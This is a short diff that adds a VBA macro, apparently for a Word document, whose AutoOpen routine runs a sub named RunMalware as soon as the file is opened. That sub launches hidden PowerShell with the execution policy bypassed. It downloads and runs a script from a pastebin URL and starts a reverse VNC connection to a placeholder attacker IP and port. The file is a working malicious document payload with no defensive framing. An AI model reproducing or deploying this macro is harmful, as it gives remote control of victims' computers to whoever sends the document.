@@ -1,0 +1,13 @@
+
+Sub RunMalware ()
+	Dim x As Variant
+	Dim c As String
+	c = "IEX (New-Object System.Net.Webclient). DownloadString('https://pastebin.com/GrksrPli');" & _
+		"Invoke-Vnc -ConType reverse -IpAddress <yourIP> -Port <listening port> -Password 123"
+	x = Shell ("POWERSHELL.exe -nologo -WindowStyle Hidden -ExecutionPolicy Bypass -c """ & c & """", 1)
+End Sub
+
+Sub AutoOpen()
+	'''MsgBox ("AutoOpen()")
+	Call RunMalware
+End Sub
